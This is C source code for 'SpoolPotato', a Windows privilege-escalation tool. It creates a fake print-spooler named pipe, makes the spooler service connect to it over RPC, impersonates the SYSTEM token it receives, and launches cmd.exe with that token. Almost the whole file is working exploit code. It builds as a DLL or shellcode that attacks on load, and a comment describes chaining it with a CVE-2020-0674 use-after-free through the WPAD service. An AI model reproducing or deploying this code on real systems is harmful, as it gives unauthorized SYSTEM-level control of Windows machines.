#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>
#include <wtsapi32.h>
#include <stdint.h>
#include "IWinSpool_h.h"

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")
#pragma warning(disable: 28251)

////////
////////
// Global settings
////////

//#define DEBUG
//#define EXE_BUILD
#define DLL_BUILD
#define SHELLCODE_BUILD
//#define SESSION_ID 1
#define COMMAND_LINE L"cmd.exe"
#define INTERACTIVE_PROCESS FALSE
#define SYNC_EVENT_NAME L"Global\\DoubleStarEvent"

////////
////////
// Debug logic
////////

void DebugLog(const wchar_t* Format, ...) {
#ifdef DEBUG
    va_list Args;
    static wchar_t* pBuffer = NULL;

    if (pBuffer == NULL) {
        pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
    }
    else {
        ZeroMemory(pBuffer, 10000 * 2);
    }

    va_start(Args, Format);
    wvsprintfW(pBuffer, Format, Args);
    va_end(Args);
#ifdef DLL_BUILD
    uint32_t dwMsgAnswer = 0;
    WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, WTSGetActiveConsoleSessionId(), (wchar_t*)L"", 0, pBuffer, (wcslen(pBuffer) + 1) * 2, 0, 0, &dwMsgAnswer, TRUE);
#endif
#ifdef EXE_BUILD
    printf("%ws\r\n", pBuffer);
#endif
    //HeapFree(GetProcessHeap(), 0, pBuffer);
#endif
}

////////
////////
// Privilege/token manipulation logic
////////

BOOL EnablePrivilege(const wchar_t *PrivilegeName) {
    BOOL bResult = FALSE;
    HANDLE hToken = INVALID_HANDLE_VALUE;
    uint32_t dwTokenPrivilegesSize = 0;
    PTOKEN_PRIVILEGES pTokenPrivileges = NULL;

    // Obtain the primary token for the current process, query its privileges (LUIDs) and find the entry which matches the specified privilege name. Once it is found use its LUID to adjust the token privileges for the process token to enable the desired privilege 
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        if (!GetTokenInformation(hToken, TokenPrivileges, NULL, dwTokenPrivilegesSize, (PDWORD)&dwTokenPrivilegesSize) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            pTokenPrivileges = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwTokenPrivilegesSize);

            if (GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenPrivilegesSize, (PDWORD)&dwTokenPrivilegesSize)) {
                for (uint32_t dwX = 0; dwX < pTokenPrivileges->PrivilegeCount && !bResult; dwX++) {
                    LUID_AND_ATTRIBUTES LuidAttributes = pTokenPrivileges->Privileges[dwX];
                    uint32_t dwPrivilegeNameLength = 0;

                    if (!LookupPrivilegeNameW(NULL, &(LuidAttributes.Luid), NULL, (PDWORD)&dwPrivilegeNameLength) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                        dwPrivilegeNameLength++; // Returned name length does not include NULL terminator
                        wchar_t *pCurrentPrivilegeName = (wchar_t *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPrivilegeNameLength * sizeof(WCHAR));

                        if (LookupPrivilegeNameW(NULL, &(LuidAttributes.Luid), pCurrentPrivilegeName, (PDWORD)&dwPrivilegeNameLength)) {
                            if (!_wcsicmp(pCurrentPrivilegeName, PrivilegeName)) {
                                TOKEN_PRIVILEGES TokenPrivs = { 0 };
                                TokenPrivs.PrivilegeCount = 1;
                                TokenPrivs.Privileges[0].Luid = LuidAttributes.Luid;
                                TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                                if (AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                                    bResult = TRUE;
                                }
                            }

                            HeapFree(GetProcessHeap(), 0, pCurrentPrivilegeName);
                        }
                    }
                }
            }

            HeapFree(GetProcessHeap(), 0, pTokenPrivileges);
        }
        else {
            DebugLog(L"... failed to query required token information length from primary process token.");
        }

        CloseHandle(hToken);
    }
    else {
        DebugLog(L"... failed to open handle to primary token of the current process with query/modify permissions.");
    }

    return bResult;
}

////////
////////
// Spool named pipe manipulation logic
////////

BOOL CreateFakeSpoolPipe(HANDLE *phPipe, HANDLE *phEvent, wchar_t **ppSpoolPipeUuidStr) {
    UUID Uuid = { 0 };

    // Create the named pipe that the print spooler service will connect to over RPC. Setup an event associated with it for listener purposes.

    if (UuidCreate(&Uuid) == RPC_S_OK) {
        if (UuidToStringW(&Uuid, ppSpoolPipeUuidStr) == RPC_S_OK && *ppSpoolPipeUuidStr != NULL) {
            wchar_t FakePipeName[MAX_PATH + 1] = { 0 };
            SECURITY_DESCRIPTOR Sd = { 0 };
            SECURITY_ATTRIBUTES Sa = { 0 };

            _snwprintf_s(FakePipeName, MAX_PATH, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", *ppSpoolPipeUuidStr);
            DebugLog(L"... generated fake spool pipe name of %ws", FakePipeName);

            if (InitializeSecurityDescriptor(&Sd, SECURITY_DESCRIPTOR_REVISION)) {
                if (ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&Sa)->lpSecurityDescriptor), NULL)) {
                    if ((*phPipe = CreateNamedPipeW(FakePipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &Sa)) != NULL) { // FILE_FLAG_OVERLAPPED allows for the creation of an async pipe
                        OVERLAPPED Overlapped = { 0 };

                        *phEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
                        Overlapped.hEvent = *phEvent;

                        if (!ConnectNamedPipe(*phPipe, &Overlapped)) {
                            if (GetLastError() == ERROR_IO_PENDING) {
                                DebugLog(L"... named pipe connection successful");
                                return TRUE;
                            }
                            else {
                                DebugLog(L"... named pipe connection failed with invalid error code");
                            }
                        }
                        else {
                            DebugLog(L"... named pipe connection succeeded while it should have failed with ERROR_IO_PENDING");
                        }
                    }
                }
            }
        }
    }

    return FALSE;
}

uint32_t TriggerPrintSpoolerRpc(wchar_t *pSpoolPipeUuidStr) {
    wchar_t ComputerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    uint32_t dwComputerNameLen = MAX_COMPUTERNAME_LENGTH + 1;

    if (GetComputerNameW(ComputerName, &dwComputerNameLen)) {
        wchar_t TargetServer[MAX_PATH + 1] = { 0 };
        wchar_t CaptureServer[MAX_PATH + 1] = { 0 };
        DEVMODE_CONTAINER DevmodeContainer = { 0 };
        PRINTER_HANDLE hPrinter = NULL;

        _snwprintf_s(TargetServer, MAX_PATH, MAX_PATH, L"\\\\%ws", ComputerName); // The target server will initiate the named pipe connection
        _snwprintf_s(CaptureServer, MAX_PATH, MAX_PATH, L"\\\\%ws/pipe/%ws", ComputerName, pSpoolPipeUuidStr); // The capture server will receive the named pipe connection

        RpcTryExcept {
            if (RpcOpenPrinter(TargetServer, &hPrinter, NULL, &DevmodeContainer, 0) == RPC_S_OK) {
                RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, CaptureServer, 0, NULL);
                RpcClosePrinter(&hPrinter);
            }
        }
        RpcExcept(EXCEPTION_EXECUTE_HANDLER);
        {
            // Expect RPC_S_SERVER_UNAVAILABLE
        }
        RpcEndExcept;

        if (hPrinter != NULL) {
            RpcClosePrinter(&hPrinter);
        }
    }

    return 0;
}

BOOL LaunchImpersonatedProcess(HANDLE hPipe, const wchar_t *CommandLine, uint32_t dwSessionId, BOOL bInteractive) {
    BOOL bResult = FALSE;
    HANDLE hSystemToken = INVALID_HANDLE_VALUE;
    HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

    // Impersonate the specified pipe, duplicate and then customize its token to fit the appropriate session ID and desktop, and launch a process in its context.

    if (ImpersonateNamedPipeClient(hPipe)) {
        DebugLog(L"... named pipe impersonation successful");

        if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken)) {
            if (DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup)) {
                wchar_t CurrentDirectory[MAX_PATH + 1] = { 0 };
                uint32_t dwCreationFlags = 0;
                void *pEnvironment = NULL;
                PROCESS_INFORMATION ProcInfo = { 0 };
                STARTUPINFOW StartupInfo = { 0 };
                wchar_t CommandLineBuf[500] = { 0 };

                if (dwSessionId) {
                    if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &dwSessionId, sizeof(uint32_t))) {
                        DebugLog(L"... non-zero session ID specified but token session ID modification failed");
                        return FALSE;
                    }
                }

                dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
                dwCreationFlags |= bInteractive ? 0 : CREATE_NEW_CONSOLE;

                if (GetSystemDirectoryW(CurrentDirectory, MAX_PATH)) {
                    if (CreateEnvironmentBlock(&pEnvironment, hSystemTokenDup, FALSE)) {
                        StartupInfo.cb = sizeof(STARTUPINFOW);
                        StartupInfo.lpDesktop = L"WinSta0\\Default";

                        wcscpy_s(CommandLineBuf, 500, CommandLine);

                        if (!CreateProcessAsUserW(hSystemTokenDup, NULL, CommandLineBuf, NULL, NULL, bInteractive, dwCreationFlags, pEnvironment, CurrentDirectory, &StartupInfo, &ProcInfo)) {
                            if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD) {
                                DebugLog(L"... CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW()...");
                                RevertToSelf();

                                if (!bInteractive) {
                                    wcscpy_s(CommandLineBuf, 500, CommandLine);

                                    if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, CommandLineBuf, dwCreationFlags, pEnvironment, CurrentDirectory, &StartupInfo, &ProcInfo)) {
                                        DebugLog(L"... CreateProcessWithTokenW() failed. Error: %d", GetLastError());
                                    }
                                    else {
                                        DebugLog(L"... CreateProcessWithTokenW() successfully executed %ws", CommandLine);
                                        bResult = TRUE;
                                    }
                                }
                                else {
                                    DebugLog(L"... CreateProcessWithTokenW() isn't compatible with non-zero session ID");
                                }
                            }
                            else {
                                DebugLog(L"... CreateProcessAsUser() failed. Error: %d", GetLastError());
                            }
                        }
                        else {
                            DebugLog(L"... CreateProcessAsUser() successfully executed command line %ws", CommandLine);
                            bResult = TRUE;
                        }

                        if (bResult) {
                            if (bInteractive) {
                                fflush(stdout);
                                WaitForSingleObject(ProcInfo.hProcess, INFINITE);
                            }

                            CloseHandle(ProcInfo.hProcess);
                            CloseHandle(ProcInfo.hThread);
                        }

                        DestroyEnvironmentBlock(pEnvironment);
                    }
                }

                CloseHandle(hSystemTokenDup);
            }

            CloseHandle(hSystemToken);
        }
    }
    else {
        DebugLog(L"... named pipe impersonation failed");
    }

    return bResult;
}

BOOL SpoolPotato() {
    if(EnablePrivilege(SE_IMPERSONATE_NAME)) {
        wchar_t* pSpoolPipeUuidStr = NULL;
        HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
        HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
        HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
        uint32_t dwWaitError = 0;

        DebugLog(L"... successfully obtained %ws privilege", SE_IMPERSONATE_NAME);

        if (CreateFakeSpoolPipe(&hSpoolPipe, &hSpoolPipeEvent, &pSpoolPipeUuidStr)) {
            DebugLog(L"... named pipe creation and connection successful. Listening...");
            CreateThread(NULL, 0, TriggerPrintSpoolerRpc, pSpoolPipeUuidStr, 0, NULL);
            dwWaitError = WaitForSingleObject(hSpoolPipeEvent, 5000);

            if (dwWaitError == WAIT_OBJECT_0) {
                DebugLog(L"... recieved connection over named pipe");

                if (LaunchImpersonatedProcess(hSpoolPipe, COMMAND_LINE, WTSGetActiveConsoleSessionId(), INTERACTIVE_PROCESS)) {
                    DebugLog(L"... successfully launched process while impersonating RPC client. Syncing event file with WPAD client...");

                    /*
                    SpoolPotato/WPAD client synchronization

                    Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
                    the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
                    often yield a successful status from WPAD.

                    To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
                    attempt to trigger the PAC download until it receives confirmation via an event object from within
                    the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
                    the CVE-2020-0674 UAF.

                    The WPAD client initially:
                    1. Creates a sync event object in \BaseNamedObjects and then proceeds to repeatedly make RPC calls to
                       WPAD in a loop.
                    2. Between each iteration of the loop it spends several seconds waiting for the signal event it
                       previously created to be signalled by SpoolPotato.
                    3. Once the event has been triggered the WPAD client ends its loop and terminates.

                    Meanwhile the SpoolPotato shellcode:
                    1. Makes its privilege escalation operations.
                    2. Waits for the sync event to be created by the WPAD client.
                    3. Signals the event object to signal completion to the WPAD client.
                    4. Terminates itself.
                    */

                    HANDLE hEvent;
                    
                    while((hEvent = OpenEventW(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, SYNC_EVENT_NAME)) == NULL) {
                        Sleep(500);
                    }

                    SetEvent(hEvent);
                    CloseHandle(hEvent);
                    DebugLog(L"... successfully synced WPAD client event file and deleted it");
                }
                else {
                    DebugLog(L"... failed to launch process while impersonating RPC client");
                }
            }
            else {
                DebugLog(L"... named pipe listener failed with wait error %d", dwWaitError);
            }

            CloseHandle(hSpoolPipe);
            CloseHandle(hSpoolPipeEvent);
        }
        else {
            DebugLog(L"... named pipe creation and connection failed");
        }
    }
    else {
        DebugLog(L"... failed to obtain %ws privilege", SE_IMPERSONATE_NAME);
    }

    return 0;
}

#ifdef DLL_BUILD
BOOL DllMain(HMODULE hModule, uint32_t dwReason, void* pReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
#ifdef SHELLCODE_BUILD
        SpoolPotato();
#else
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SpoolPotato, NULL, 0, NULL);
#endif
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
}

    return TRUE;
}
#else
int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
    SpoolPotato();
    return 0;
}
#endif